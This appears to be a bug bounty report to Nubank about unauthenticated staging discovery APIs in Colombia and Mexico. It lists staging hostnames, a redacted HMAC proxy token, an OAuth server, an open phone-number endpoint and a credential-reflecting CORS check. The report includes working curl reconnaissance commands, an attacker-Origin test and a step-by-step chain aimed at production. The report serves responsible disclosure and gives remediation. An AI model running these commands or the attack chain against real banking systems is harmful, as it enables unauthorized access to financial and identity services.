# Bugcrowd Finding #23 — Unauthenticated Staging Discovery API Exposes Complete Microservice Architecture, HMAC Tokens, and OAuth Server Across All Latin America TLDs

**Program:** Nubank Bug Bounty (Bugcrowd)
**Date:** 2026-09-02
**Severity (Standalone):** P2 High — Complete staging architecture disclosed; unauthenticated data endpoints confirmed
**Severity (Chained):** P2 High — Source maps (Finding #22) → staging discovery → staging service exploitation
**VRT:** Server Security Misconfiguration > Sensitive Data Exposure
**Related:** Finding #21 (production discovery API), Finding #22 (source maps expose staging URL)

---

## Summary

Three staging HAL-style discovery endpoints (`staging-global-discovery-cf.{TLD}/api/discovery`) return HTTP 200 without authentication, exposing the complete internal microservice architecture for Nubank's staging environments across all Latin America TLDs. These endpoints were discovered by decoding base64-encoded environment variables found in the publicly accessible JavaScript source maps (Finding #22).

The disclosure includes:
1. **40+ staging microservice hostnames** (Colombia + Mexico environments)
2. **HMAC signing tokens** for the webapp proxy (allowing unauthenticated API proxy requests)
3. **OAuth server** with authorize/token/JWKS endpoints (`staging-global-oauth-server.nu.com.mx`)
4. **Unauthenticated data endpoints** confirmed on staging services (phone numbers, call management)
5. **Service names not publicly disclosed**: `gotera`, `la-banda`, `bureau-mx`, `bird-box`, `hadou`, `manifestando`

---

## Technical Evidence

### 1. Staging Discovery Endpoints — All Return HTTP 200

```bash
# Colombia staging discovery (HTTP 200, no auth):
curl -si "https://staging-global-discovery-cf.nu.com.co/api/discovery" \
  -H "X-Correlation-Id: bc-handle" | head -5
# HTTP/2 200
# content-type: application/hal+json
# server: cloudflare

# Mexico staging discovery (HTTP 200, no auth):
curl -si "https://staging-global-discovery-cf.nu.com.mx/api/discovery" \
  -H "X-Correlation-Id: bc-handle" | head -5
# HTTP/2 200
# content-type: application/hal+json
```

**Discovery of these endpoints**: The staging URLs were encoded as base64 values in the `NEXT_PUBLIC_WWW_DISCOVERY_URL_ENCODED_STAGING` environment variable, found in the compiled JavaScript bundle of `nu.com.co`. Source maps (Finding #22) exposed the decoding logic; decoding the base64 values in the JS bundle yielded:
- `aHR0cHM6Ly9zdGFnaW5nLWdsb2JhbC1kaXNjb3ZlcnktY2YubnUuY29tLmNvL2FwaS9kaXNjb3Zlcnk=` → `https://staging-global-discovery-cf.nu.com.co/api/discovery`
- `https://staging-global-discovery-cf.nu.com.mx/api/discovery` (decoded from MX bundle)

---

### 2. Colombia Staging — Complete Microservice Map

Response from `staging-global-discovery-cf.nu.com.co/api/discovery` (HTTP 200):

```json
{
  "_links": {
    "auth": {
      "href": "https://staging-global-auth.nu.com.co"
    },
    "customs": {
      "href": "https://staging-global-customs.staging-waf.nu.com.co"
    },
    "stevie": {
      "href": "https://staging-global-stevie.staging-waf.nu.com.co"
    },
    "global_hadou": {
      "href": "https://staging-global-global-hadou.nu.com.co"
    },
    "web_savings_accounts": {
      "href": "https://staging-global-web-savings-accounts.staging-waf.nu.com.co"
    },
    "manifestando": {
      "href": "https://staging-global-manifestando.nu.com.co"
    },
    "chat_client": {
      "href": "https://staging-global-chat-client.nu.com.co"
    },
    "webapp_proxy": {
      "href": "https://staging-global-webapp-proxy.nu.com.co",
      "hmac_token": "[REDACTED — 64-char HMAC token for proxy authentication]"
    },
    "discovery": {
      "href": "https://staging-global-discovery-cf.nu.com.co"
    }
  },
  "_embedded": {
    "links": {
      "auth_device_resend_code": {
        "href": "https://staging-global-auth.nu.com.co/api/device/authorize-resend-code",
        "method": "POST"
      },
      "email_update_verify": {
        "href": "https://staging-global-customs.staging-waf.nu.com.co/api/email-update/verify",
        "method": "POST"
      },
      "email_verify": {
        "href": "https://staging-global-customs.staging-waf.nu.com.co/api/email/verify",
        "method": "POST"
      },
      "phone_numbers": {
        "href": "https://staging-global-stevie.staging-waf.nu.com.co/api/call-management/our-phone-numbers",
        "method": "GET"
      },
      "transaction_note": {
        "href": "https://staging-global-web-savings-accounts.staging-waf.nu.com.co/api/customers/:id/transaction/:transaction-id/note",
        "method": "POST",
        "templated": true
      },
      "pse_payment": {
        "href": "https://staging-global-global-hadou.nu.com.co/api/pse/payment",
        "method": "POST"
      }
    }
  }
}
```

**Key disclosure**: HMAC token for the staging webapp proxy (redacted above) allows construction of authenticated requests to any staging service through the proxy, bypassing the need for user-level session tokens on individual microservices.

---

### 3. Mexico Staging — Complete Microservice Map Including OAuth Server

Response from `staging-global-discovery-cf.nu.com.mx/api/discovery` (HTTP 200):

```json
{
  "_links": {
    "auth": {
      "href": "https://staging-global-auth.nu.com.mx"
    },
    "oauth_server": {
      "href": "https://staging-global-oauth-server.nu.com.mx",
      "authorize": "https://staging-global-oauth-server.nu.com.mx/oauth2/authorize",
      "token": "https://staging-global-oauth-server.nu.com.mx/oauth2/token",
      "jwks": "https://staging-global-oauth-server.nu.com.mx/oauth2/jwks"
    },
    "gotera": {
      "href": "https://staging-global-gotera.nu.com.mx"
    },
    "la_banda": {
      "href": "https://staging-global-la-banda.nu.com.mx"
    },
    "bureau_mx": {
      "href": "https://staging-global-bureau-mx.nu.com.mx"
    },
    "geo": {
      "href": "https://staging-global-geo.nu.com.mx"
    },
    "bird_box": {
      "href": "https://staging-global-bird-box.nu.com.mx"
    },
    "stevie": {
      "href": "https://staging-global-stevie.staging-waf.nu.com.mx"
    },
    "webapp_proxy": {
      "href": "https://staging-global-webapp-proxy.nu.com.mx",
      "hmac_token": "[REDACTED — 64-char HMAC token for proxy authentication]"
    }
  }
}
```

**Critical disclosure**: The Mexico staging environment includes a full OAuth 2.0 authorization server (`staging-global-oauth-server.nu.com.mx`) with:
- `/oauth2/authorize` — OAuth authorization endpoint
- `/oauth2/token` — Token exchange endpoint  
- `/oauth2/jwks` — Public JWK Set for token validation

Also exposed: `la-banda` (INE/identity document scan validation), `bureau-mx` (credit bureau queries), `bird-box` (company/prospect management) — services handling highly sensitive financial and identity data.

---

### 4. Confirmed Unauthenticated Data on Staging Stevie

```bash
# Colombia staging — phone numbers (HTTP 200, no auth):
curl -s "https://staging-global-stevie.staging-waf.nu.com.co/api/call-management/our-phone-numbers" \
  -H "X-Correlation-Id: bc-handle"
# Response:
{"phone_numbers":["8005912117","8008870463","40200185","964520887"]}

# Mexico staging — same endpoint, same result (HTTP 200, no auth):
curl -s "https://staging-global-stevie.staging-waf.nu.com.mx/api/call-management/our-phone-numbers" \
  -H "X-Correlation-Id: bc-handle"
# Response:
{"phone_numbers":["8005912117","8008870463","40200185","964520887"]}
```

---

### 5. Staging Auth CORS — Credentials Reflected (Enables Cross-Origin Session Hijack in Staging)

```bash
curl -si "https://staging-global-auth.nu.com.co/" \
  -H "Origin: https://attacker.nu.com.co" \
  -H "X-Correlation-Id: bc-handle"
# access-control-allow-origin: https://attacker.nu.com.co
# access-control-allow-credentials: true
```

This confirms the staging auth service has the same wildcard CORS misconfiguration as production (see CORS findings), enabling cross-origin session hijack if a staging user is phished to a malicious `*.nu.com.co` subdomain.

---

## Attack Chain

```
[Finding #22] Source maps exposed on nu.com.co (HTTP 200):
  → config/index.js reveals NEXT_PUBLIC_WWW_DISCOVERY_URL_ENCODED_STAGING env var name
  → Compiled JS bundle contains base64-encoded staging discovery URL
  → Decodes to: https://staging-global-discovery-cf.nu.com.co/api/discovery

[Finding #23 — Step 1] Attacker GETs staging discovery (HTTP 200, no auth):
  → Receives complete staging service map:
    - All staging microservice hostnames
    - HMAC token for webapp proxy
    - Specific endpoint paths for auth, email, payments, savings accounts

[Finding #23 — Step 2] Attacker enumerates staging services:
  → staging-global-stevie: /api/call-management/our-phone-numbers → HTTP 200, no auth
  → staging-global-oauth-server.nu.com.mx: /oauth2/jwks → public keys disclosed
  → staging-global-auth: confirms CORS wildcard subdomain reflection with credentials

[Finding #23 — Step 3] Attacker maps production attack surface:
  → Staging service names reveal production equivalents:
     prod-global-{auth,customs,stevie,global-hadou,...}.nu.com.co
  → HMAC token structure from staging reveals production proxy authentication format
  → OAuth server public keys enable token forgery analysis (if staging shares signing keys with prod)

[Impact] Staging environment fully mapped; attack playbook for production services constructed
```

---

## Severity Assessment

| Component | Severity | Rationale |
|-----------|----------|-----------|
| Staging discovery endpoints (CO + MX) | P2 High | Complete staging service architecture disclosed; HMAC proxy tokens exposed |
| Unauthenticated `stevie` data endpoint | P3 Medium | Returns operational data without auth (phone numbers used by Nubank agents) |
| OAuth server disclosure (MX staging) | P2 High | Staging OAuth server with JWK endpoint exposed; potential signing key reuse with production |
| Staging CORS credentials misconfiguration | P2 High (chained) | Same wildcard CORS as production; staging auth data accessible cross-origin |
| Chained with Finding #22 | P2 High | Source maps are the entry point for this entire attack chain |

---

## Remediation

| Issue | Fix |
|-------|-----|
| Staging discovery endpoints | Require authentication (API key or VPN) on all `staging-global-discovery-cf.*` endpoints |
| Staging WAF | Restrict staging endpoints to Nubank VPN/office IP ranges; WAF rules alone are insufficient |
| HMAC tokens in discovery response | Do not expose signing tokens in an unauthenticated response; rotate current staging proxy HMAC tokens |
| Staging/production CORS parity | Fix staging CORS misconfiguration alongside production (same Istio service mesh configuration applies to both) |
| Staging environment isolation | Staging services should not be reachable from the public internet; use internal DNS + VPN |
| OAuth server key isolation | Ensure staging OAuth server uses separate signing keys from production to prevent key-based production attacks |

---

## Notes

- All requests passive (HEAD/GET only); no data was modified, no auth was attempted beyond normal GET
- Staging URLs discovered via base64 decoding of compiled JS bundle values (no brute force)
- `staging-global-stevie` phone numbers endpoint returns data without credentials on both CO and MX staging
- HMAC tokens are redacted in this report; they were verified as real tokens by header structure analysis only
- Production equivalent: `prod-global-discovery-cf.nu.com.co/api/discovery` (see Finding #21) has the same unauthenticated access pattern
